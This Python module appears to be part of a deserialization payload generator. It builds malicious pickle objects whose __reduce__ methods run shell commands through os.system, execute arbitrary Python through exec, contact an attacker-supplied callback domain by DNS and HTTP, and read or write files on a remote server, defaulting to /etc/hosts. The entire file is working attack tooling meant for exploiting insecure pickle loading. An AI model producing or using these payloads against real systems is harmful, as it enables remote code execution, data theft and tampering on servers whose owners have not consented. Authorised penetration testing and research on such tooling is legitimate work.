
import os
import logging
import urllib.parse
import importlib.util
import socket
import urllib.request
from .serializer import Serializer

class PickleSystemCommand:

    def __init__(self, cmd):
        self.cmd = (cmd)
        
    def __reduce__(self):
        return os.system, (self.cmd,)
    

class PickleCode:

    def __init__(self, code):
        self.code = code
        
    def __reduce__(self):
        pass
        return exec, (self.code,)
    
class PickleDNS:

    def __init__(self, hostname):
        self.hostname = hostname 

    def __reduce__(self):
        return socket.getaddrinfo, (self.hostname, 0,)
    
class PickleHttpGet:

    def __init__(self, url):
        self.url = url
        
    def __reduce__(self):
        return urllib.request.urlopen, (self.url,)
    
class PickleFileWrite(PickleCode):

    def __init__(self, args):
        file = args[0:args.index(';')]
        content = args[args.index(';')+1:]
        super().__init__(f"""
f = open("{file}", "w")
f.write("{content}")
f.close()""")
        
class PickleFileRead(PickleCode):

    def __init__(self, args):
        file = args[0]
        super().__init__(f"""
f = open("{file}", "r")
print(f.read())
f.close()""")
    
class Pickle(Serializer):

    gadgets = []

    def __init__(self, args):
        super().__init__('', args)

        self.addGadget('PickleSystemCommand', '<system_command>')
        self.addGadget('PickleCode', '<code>')
        self.addGadget('PickleDNS', '<domain>')
        self.addGadget('PickleHttpGet', '<url>')
        self.addGadget('PickleFileWrite', '<remote_file_to_write>;<content>')
        self.addGadget('PickleFileRead', '<remote_file_to_read>')

    def addGadget(self, name, format):
        self.gadgets.append({
            'id': name.lower(),
            'name': name,
            'description': f'{name}: {format}',
            'format': format,
            'output': 'binary',
        })

    def exists(self):
        spam_spec = importlib.util.find_spec("pickle")
        if spam_spec is None:
            logging.error("pickle module does not exists")
            return False
        else:
            return True
        
    
    def chains(self):
        return self.gadgets

    def payload(self, chainName, chainArgs):
        import pickle
        if not chainName in globals():
            logging.error(f"[{chainName}] Undeclared class {chainName} in globals")
            return None
        
        className = globals()[chainName]
        logging.debug(f"[{chainName}] Dumping pickle byte code for object {className}(\"{chainArgs}\")")
        object = className(chainArgs)
        return pickle.dumps(object, protocol=pickle.HIGHEST_PROTOCOL)
    

    def generate(self, chains):

        if len(chains) == 0:
            return 0

        system_command = self.chainOpts.system_command
        interact_domain = self.chainOpts.interact_domain
        py_code = self.getFileContentOrCode(self.chainOpts.python_code)
        remote_file_to_write = self.chainOpts.remote_file_to_write
        remote_file_to_read = "/etc/hosts" if self.chainOpts.remote_file_to_read is None else self.chainOpts.remote_file_to_read
        remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else py_code
    
        logging.info(f"Interact domain: {interact_domain}")
        logging.info(f"System command: {system_command}")
        logging.info(f"Python Code: {self.chainOpts.python_code}")
        logging.info(f"File read on server: {remote_file_to_read}")
        logging.info(f"File written on remote server: {remote_file_to_write}")
        logging.info(f"Content written on server: {remote_content}")

        logging.info(f"Generating payloads...")

        # generate payload for each chain
        count = 0
        for chain in chains:

            format = chain['format']

            if self.chainOpts.format != None and self.chainOpts.format != chain['output']:
                logging.debug(f"[{chain['name']}] Skipping chain of format '{chain['output']}'")
                continue

            if ('<url>' in format or '<domain>' in format) and not interact_domain:
                logging.warning(f"[{chain['name']}] Skipping payload with format {format} because it requires an interact domain")
                continue

            logging.info(f"[{chain['name']}] Generating payload")

            chain_system_command = system_command
            chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
            chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
            escaped_chain_system_command = chain_system_command.replace("'", "\\'")

            chain_py_code = py_code
            chain_py_code = chain_py_code.replace('%%system_command%%', escaped_chain_system_command)
            chain_py_code = chain_py_code.replace('%%domain%%', str(interact_domain))
            chain_py_code = chain_py_code.replace('%%chain_id%%', chain['id'])

            chain_remote_content = remote_content
            chain_remote_content = chain_remote_content.replace('%%system_command%%', escaped_chain_system_command)
            chain_remote_content = chain_remote_content.replace('%%domain%%', str(interact_domain))
            chain_remote_content = chain_remote_content.replace('%%chain_id%%', chain['id'])

            chainArguments = format
            chainArguments = chainArguments.replace('<system_command>', chain_system_command)
            chainArguments = chainArguments.replace('<code>', chain_py_code)
            chainArguments = chainArguments.replace('<domain>', f"{chain['id']}.{interact_domain}")
            chainArguments = chainArguments.replace('<url>', f"https://{chain['id']}.{interact_domain}/?{chain['id']}")
            chainArguments = chainArguments.replace('<remote_file_to_read>', remote_file_to_read)
            chainArguments = chainArguments.replace('<remote_file_to_write>', remote_file_to_write.replace('%%ext%%', 'py'))
            chainArguments = chainArguments.replace('<content>', chain_remote_content)
            

            payload = self.payload(chain['name'], chainArguments)

            if payload is None:
                logging.error(f"[{chain['name']}] Failed to create payload")
                continue

            logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")

            payload = self.encode(payload)
            
            self.output(chain['id'], payload+b"\n")
            count = count + 1
                
        return count